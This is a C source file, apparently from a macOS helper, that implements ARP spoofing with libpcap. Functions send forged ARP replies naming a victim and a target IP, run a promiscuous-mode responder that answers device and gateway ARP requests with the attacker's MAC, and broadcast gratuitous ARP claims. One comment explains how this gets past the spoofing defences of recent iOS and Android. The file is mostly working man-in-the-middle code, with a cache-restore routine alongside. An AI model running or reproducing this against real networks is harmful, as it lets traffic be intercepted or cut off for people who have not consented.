#include "wm_arp.h"

#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define ETH_TYPE_ARP 0x0806
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY   2

#pragma pack(push, 1)
typedef struct {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t etype;
} eth_hdr_t;

typedef struct {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t op;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
} arp_pkt_t;
#pragma pack(pop)

static int parse_ip4(const char *s, uint8_t out[4]) {
    struct in_addr a;
    if (!s || inet_pton(AF_INET, s, &a) != 1) return -1;
    memcpy(out, &a.s_addr, 4);
    return 0;
}

static int unicast_mac(const uint8_t *mac) {
    static const uint8_t zero[6] = {0};
    return mac && !(mac[0] & 1) && memcmp(mac, zero, 6) != 0;
}

static int host_ip4(const uint8_t *ip) {
    return ip && ip[0] != 0 && ip[0] != 127 && ip[0] < 224;
}

static int build_arp(uint8_t *frame,
                     const uint8_t dst_mac[6],
                     const uint8_t src_mac[6],
                     uint16_t op,
                     const uint8_t sender_mac[6],
                     const uint8_t sender_ip[4],
                     const uint8_t target_mac[6],
                     const uint8_t target_ip[4]) {
    eth_hdr_t *eth = (eth_hdr_t *)frame;
    memcpy(eth->dst, dst_mac, 6);
    memcpy(eth->src, src_mac, 6);
    eth->etype = htons(ETH_TYPE_ARP);

    arp_pkt_t *arp = (arp_pkt_t *)(frame + sizeof(eth_hdr_t));
    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->op = htons(op);
    memcpy(arp->sender_mac, sender_mac, 6);
    memcpy(arp->sender_ip,  sender_ip,  4);
    memcpy(arp->target_mac, target_mac, 6);
    memcpy(arp->target_ip,  target_ip,  4);

    return (int)(sizeof(eth_hdr_t) + sizeof(arp_pkt_t));
}

void *wm_arp_open(const char *iface, char *errbuf) {
    char eb[PCAP_ERRBUF_SIZE];
    pcap_t *p = pcap_create(iface, eb);
    if (!p) { snprintf(errbuf, 256, "pcap_create: %s", eb); return NULL; }
    pcap_set_snaplen(p, 96);
    pcap_set_promisc(p, 0);
    pcap_set_timeout(p, 100);
    pcap_set_immediate_mode(p, 1);
    int rc = pcap_activate(p);
    if (rc < 0) {
        snprintf(errbuf, 256, "pcap_activate: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    return p;
}

void wm_arp_close(void *handle) {
    if (handle) pcap_close((pcap_t *)handle);
}

/* Min ETH frame on the wire is 60 bytes (no FCS — driver appends it).
 * Some Wi-Fi drivers silently drop frames shorter than that; pad to 60
 * so injection never fails for length reasons. */
#define ETH_MIN_LEN 60

/* Surface pcap_inject failures so we can tell the difference between
 * "spoofer is running" and "spoofer is running but every frame is being
 * rejected." stderr is captured by launchd into the helper err log. */
static int do_inject(pcap_t *p, const uint8_t *frame, int len, const char *who) {
    int r = pcap_inject(p, frame, len);
    if (r != len) {
        fprintf(stderr, "wm_arp[%s]: pcap_inject failed (rc=%d): %s\n",
                who, r, pcap_geterr(p));
        fflush(stderr);
        return -1;
    }
    return 0;
}

int wm_arp_send_spoof(void *handle,
                      const uint8_t our_mac[6],
                      const uint8_t victim_mac[6],
                      const char   *victim_ip,
                      const char   *target_ip) {
    uint8_t v_ip[4], t_ip[4];
    if (!handle || !unicast_mac(our_mac) || !unicast_mac(victim_mac)
        || memcmp(our_mac, victim_mac, 6) == 0) return -1;
    if (parse_ip4(victim_ip, v_ip) < 0) return -1;
    if (parse_ip4(target_ip, t_ip) < 0) return -1;
    if (!host_ip4(v_ip) || !host_ip4(t_ip) || memcmp(v_ip, t_ip, 4) == 0) return -1;

    uint8_t frame[ETH_MIN_LEN];
    memset(frame, 0, sizeof(frame));
    (void)build_arp(frame,
                    victim_mac, our_mac,
                    ARP_OP_REPLY,
                    our_mac, t_ip,
                    victim_mac, v_ip);
    return do_inject((pcap_t *)handle, frame, ETH_MIN_LEN, "spoof");
}

int wm_arp_send_restore(void *handle,
                        const uint8_t real_mac[6],
                        const uint8_t victim_mac[6],
                        const char   *victim_ip,
                        const char   *target_ip) {
    uint8_t v_ip[4], t_ip[4];
    if (!handle || !unicast_mac(real_mac) || !unicast_mac(victim_mac)
        || memcmp(real_mac, victim_mac, 6) == 0) return -1;
    if (parse_ip4(victim_ip, v_ip) < 0) return -1;
    if (parse_ip4(target_ip, t_ip) < 0) return -1;
    if (!host_ip4(v_ip) || !host_ip4(t_ip) || memcmp(v_ip, t_ip, 4) == 0) return -1;

    uint8_t frame[ETH_MIN_LEN];
    memset(frame, 0, sizeof(frame));
    (void)build_arp(frame,
                    victim_mac, real_mac,
                    ARP_OP_REPLY,
                    real_mac, t_ip,
                    victim_mac, v_ip);
    return do_inject((pcap_t *)handle, frame, ETH_MIN_LEN, "restore");
}

int wm_arp_send_request(void *handle,
                        const uint8_t our_mac[6],
                        const char   *our_ip,
                        const char   *target_ip) {
    uint8_t s_ip[4], t_ip[4];
    if (parse_ip4(our_ip,    s_ip) < 0) return -1;
    if (parse_ip4(target_ip, t_ip) < 0) return -1;

    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t zero[6]      = {0,0,0,0,0,0};

    uint8_t frame[ETH_MIN_LEN];
    memset(frame, 0, sizeof(frame));
    (void)build_arp(frame,
                    broadcast, our_mac,
                    ARP_OP_REQUEST,
                    our_mac, s_ip,
                    zero, t_ip);
    return do_inject((pcap_t *)handle, frame, ETH_MIN_LEN, "request");
}

/* ---- Reactive ARP responder ---------------------------------------------- */

void *wm_arp_resp_open(const char *iface, char *errbuf) {
    char eb[PCAP_ERRBUF_SIZE];
    pcap_t *p = pcap_create(iface, eb);
    if (!p) { snprintf(errbuf, 256, "pcap_create: %s", eb); return NULL; }
    /* Need the full ARP frame (eth 14 + arp 28 = 42), snaplen 96 is plenty. */
    pcap_set_snaplen(p, 96);
    pcap_set_promisc(p, 1);          /* see unicast probes aimed at our MAC */
    pcap_set_timeout(p, 10);         /* snappy non-blocking-ish pump */
    pcap_set_immediate_mode(p, 1);
    int rc = pcap_activate(p);
    if (rc < 0) {
        snprintf(errbuf, 256, "pcap_activate: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    /* ARP-only BPF filter so the read loop isn't drowned by other traffic. */
    struct bpf_program prog;
    if (pcap_compile(p, &prog, "arp", 1, PCAP_NETMASK_UNKNOWN) < 0) {
        snprintf(errbuf, 256, "pcap_compile: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    rc = pcap_setfilter(p, &prog);
    pcap_freecode(&prog);
    if (rc < 0) {
        snprintf(errbuf, 256, "pcap_setfilter: %s", pcap_geterr(p));
        pcap_close(p);
        return NULL;
    }
    /* BPF's read timeout may wait indefinitely until the first packet. An
     * actor cannot close its handle while blocked in read, so require actual
     * nonblocking mode rather than relying on the capture timeout. */
    if (pcap_setnonblock(p, 1, eb) < 0) {
        snprintf(errbuf, 256, "pcap_setnonblock: %s", eb);
        pcap_close(p);
        return NULL;
    }
    return p;
}

void wm_arp_resp_close(void *handle) {
    if (handle) pcap_close((pcap_t *)handle);
}

int wm_arp_resp_pump(void *handle,
                     const uint8_t our_mac[6],
                     const uint8_t our_ip[4],
                     const uint8_t gateway_mac[6],
                     const uint8_t gateway_ip[4],
                     const uint8_t *target_ips,
                     const uint8_t *target_macs,
                     int            n_targets,
                     int            max_pkts) {
    pcap_t *p = (pcap_t *)handle;
    if (!p || n_targets <= 0 || max_pkts <= 0 || !target_ips || !target_macs
        || !unicast_mac(our_mac) || !unicast_mac(gateway_mac)
        || !host_ip4(our_ip) || !host_ip4(gateway_ip)
        || memcmp(our_mac, gateway_mac, 6) == 0
        || memcmp(our_ip, gateway_ip, 4) == 0) return 0;
    int sent = 0;
    for (int i = 0; i < max_pkts; i++) {
        struct pcap_pkthdr *hdr;
        const u_char *data;
        int rc = pcap_next_ex(p, &hdr, &data);
        if (rc == 0) break;          /* live timeout, nothing pending */
        if (rc < 0) return -1;       /* fatal */
        if (!hdr || !data) continue;
        if (hdr->caplen < sizeof(eth_hdr_t) + sizeof(arp_pkt_t)) continue;

        const eth_hdr_t *eth = (const eth_hdr_t *)data;
        if (ntohs(eth->etype) != ETH_TYPE_ARP) continue;
        const arp_pkt_t *arp = (const arp_pkt_t *)(data + sizeof(eth_hdr_t));
        if (ntohs(arp->htype) != 1 || ntohs(arp->ptype) != 0x0800
            || arp->hlen != 6 || arp->plen != 4
            || ntohs(arp->op) != ARP_OP_REQUEST) continue;
        if (!unicast_mac(arp->sender_mac) || !host_ip4(arp->sender_ip)
            || memcmp(eth->src, arp->sender_mac, 6) != 0) continue;
        /* Self protection uses both identities, including stale cache aliases. */
        if (memcmp(arp->sender_mac, our_mac, 6) == 0
            || memcmp(arp->sender_ip, our_ip, 4) == 0) continue;

        /* Each selected pair permits only device -> gateway or gateway ->
         * device. A trusted client asking for either IP receives no reply. */
        int match = 0;
        for (int j = 0; j < n_targets; j++) {
            const uint8_t *target_ip = target_ips + (size_t)j * 4;
            const uint8_t *target_mac = target_macs + (size_t)j * 6;
            if (!host_ip4(target_ip) || !unicast_mac(target_mac)
                || memcmp(target_ip, our_ip, 4) == 0
                || memcmp(target_ip, gateway_ip, 4) == 0
                || memcmp(target_mac, our_mac, 6) == 0
                || memcmp(target_mac, gateway_mac, 6) == 0) continue;
            if ((memcmp(arp->sender_ip, target_ip, 4) == 0
                 && memcmp(arp->sender_mac, target_mac, 6) == 0
                 && memcmp(arp->target_ip, gateway_ip, 4) == 0)
                || (memcmp(arp->sender_ip, gateway_ip, 4) == 0
                    && memcmp(arp->sender_mac, gateway_mac, 6) == 0
                    && memcmp(arp->target_ip, target_ip, 4) == 0)) {
                match = 1;
                break;
            }
        }
        if (!match) continue;

        /* Unicast REPLY straight back to the asker:
         *   "<target_ip> is-at our_mac". */
        uint8_t frame[ETH_MIN_LEN];
        memset(frame, 0, sizeof(frame));
        (void)build_arp(frame,
                        arp->sender_mac,   /* eth dst  = requester        */
                        our_mac,           /* eth src  = us               */
                        ARP_OP_REPLY,
                        our_mac,           /* sender mac = us             */
                        arp->target_ip,    /* sender ip  = the asked IP   */
                        arp->sender_mac,   /* target mac = requester      */
                        arp->sender_ip);   /* target ip  = requester      */
        if (do_inject(p, frame, ETH_MIN_LEN, "resp") != 0) return -1;
        sent++;
    }
    return sent;
}

int wm_arp_send_grat_broadcast(void *handle,
                               const uint8_t our_mac[6],
                               const char   *claim_ip) {
    /* Gratuitous ARP per RFC 5227 §3:
     *   ARP REQUEST, sender_ip == target_ip == claim_ip,
     *   sender_mac == our_mac, target_mac == 0,
     *   eth dst == ff:ff:ff:ff:ff:ff (broadcast).
     * Standard "I am claim_ip and my MAC just changed" announcement. Most OSes
     * (incl. iOS 18+ and Android 14+) accept gratuitous broadcasts as cache
     * updates, where they reject unicast unsolicited REPLYs as spoofing. */
    uint8_t ip[4];
    if (parse_ip4(claim_ip, ip) < 0) return -1;

    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t zero[6]      = {0,0,0,0,0,0};

    uint8_t frame[ETH_MIN_LEN];
    memset(frame, 0, sizeof(frame));
    (void)build_arp(frame,
                    broadcast, our_mac,
                    ARP_OP_REQUEST,
                    our_mac, ip,           /* sender == claimed IP */
                    zero, ip);             /* target == same IP, target_mac unknown */
    return do_inject((pcap_t *)handle, frame, ETH_MIN_LEN, "grat_bcast");
}
